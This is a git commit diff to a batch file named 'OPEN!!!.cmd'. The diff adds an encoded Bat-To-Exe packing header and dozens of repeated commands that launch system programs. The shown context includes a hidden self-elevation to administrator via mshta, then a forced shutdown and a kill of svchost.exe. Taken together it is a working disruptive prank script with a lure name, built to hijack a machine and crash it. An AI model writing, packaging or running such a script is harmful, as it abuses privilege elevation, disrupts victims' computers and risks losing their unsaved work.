93e30e081600a1f48a62bfb31d212a2c136e7535
zexin-cao <164744763+zexin-cao@users.noreply.github.com>
2024-11-01 22:48:10 +0800

    Add files via upload

--- OPEN!!!.cmd
+++ OPEN!!!.cmd
@@ -1,3 +1,16 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCqDJHiR4E0WJBpZSUqLP2Ta
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
 
 net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c pushd ""%~dp0"" && ""%~s0"" %*","","runas",0)(window.close) && exit
 
@@ -73,6 +86,27 @@ start Nslookup
 start cleanmgr
 start dxdiag
 start taskmgr
+start wiaacmgr
+start mspaint
+start cmd
+start notepad
+start calc
+start winver
+start Nslookup
+start cleanmgr
+start dxdiag
+start taskmgr
+start wiaacmgr
+start mspaint
+start cmd
+start notepad
+start calc
+start winver
+start Nslookup
+start cleanmgr
+start dxdiag
+start taskmgr
+start wiaacmgr
 
 shutdown -s -t 5
 taskkill /f /im svchost.exe
